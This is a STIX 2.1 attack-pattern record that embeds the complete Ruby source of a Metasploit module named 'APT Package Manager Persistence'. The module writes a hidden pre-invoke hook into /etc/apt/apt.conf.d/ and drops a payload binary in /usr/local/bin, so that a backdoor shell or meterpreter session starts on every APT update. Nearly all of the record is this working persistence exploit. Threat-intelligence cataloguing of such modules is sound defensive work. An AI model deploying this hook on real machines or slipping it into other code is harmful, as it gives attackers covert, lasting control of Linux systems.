{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--208e6232-2852-4a28-b4a6-eeae0281679e",
    "created": "2024-08-14T16:59:15.836066Z",
    "modified": "2024-08-14T16:59:15.83607Z",
    "name": "APT Package Manager Persistence",
    "description": "( This module will run a payload when the package manager is used. No handler is ran automatically so you must configure an appropriate exploit/multi/handler to connect. This module creates a pre-invoke hook for APT in apt.conf.d. The hook name syntax is numeric followed by text. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/apt_package_manager_persistence.rb",
            "external_id": "apt_package_manager_persistence.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://unix.stackexchange.com/questions/204414/how-to-run-a-command-before-download-with-apt-get"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'APT Package Manager Persistence',\n      'Description'    => %q(\n        This module will run a payload when the package manager is used. No\n        handler is ran automatically so you must configure an appropriate\n        exploit/multi/handler to connect. This module creates a pre-invoke hook\n        for APT in apt.conf.d. The hook name syntax is numeric followed by text.\n      ),\n      'License'        => MSF_LICENSE,\n      'Author'         => ['Aaron Ringo'],\n      'Platform'       => ['linux', 'unix'],\n      'Arch'           =>\n        [\n          ARCH_CMD,\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'DefaultOptions' => { 'WfsDelay' => 0, 'DisablePayloadHandler' => true },\n      'DisclosureDate' => '1999-03-09', # Date APT package manager was included in Debian\n      'References'     => ['URL', 'https://unix.stackexchange.com/questions/204414/how-to-run-a-command-before-download-with-apt-get'],\n      'Targets'        => [['Automatic', {}]],\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('HOOKNAME', [false, 'Name of hook file to write']),\n        OptString.new('BACKDOOR_NAME', [false, 'Name of binary to write'])\n      ])\n\n    register_advanced_options(\n      [\n        OptString.new('WritableDir', [true, 'A directory where we can write files', '/usr/local/bin/'])\n      ])\n  end\n\n  def exploit\n    hook_path = '/etc/apt/apt.conf.d/'\n    unless writable? hook_path\n      fail_with Failure::BadConfig, \"#{hook_path} not writable, or APT is not on system\"\n    end\n    hook_path << (datastore['HOOKNAME'] || \"#{rand_text_numeric(2)}#{rand_text_alpha(5..8)}\")\n\n    backdoor_path = datastore['WritableDir']\n    unless writable? backdoor_path\n      fail_with Failure::BadConfig, \"#{backdoor_path} is not writable\"\n    end\n    backdoor_name = datastore['BACKDOOR_NAME'] || rand_text_alphanumeric(5..10)\n    backdoor_path << backdoor_name\n\n    print_status('Attempting to write hook:')\n    hook_script = \"APT::Update::Pre-Invoke {\\\"setsid #{backdoor_path} 2>/dev/null &\\\"};\"\n    write_file(hook_path, hook_script)\n\n    unless exist? hook_path\n      fail_with Failure::Unknown, 'Failed to write Hook'\n    end\n    print_status(\"Wrote #{hook_path}\")\n\n    if payload.arch.first == 'cmd'\n      write_file(backdoor_path, payload.encoded)\n    else\n      write_file(backdoor_path, generate_payload_exe)\n    end\n\n    unless exist? backdoor_path\n      fail_with Failure::Unknown, \"Failed to write #{backdoor_path}\"\n    end\n    print_status(\"Backdoor uploaded #{backdoor_path}\")\n    print_status('Backdoor will run on next APT update')\n\n    # permissions chosen to reflect common perms in /usr/local/bin/\n    chmod(backdoor_path, 0755)\n  end\nend\n",
    "x_mitre_disclosure_date": "1999-03-09, # Date APT package manager was included in Debian",
    "x_mitre_platforms": [
        "['linux', 'unix']"
    ]
}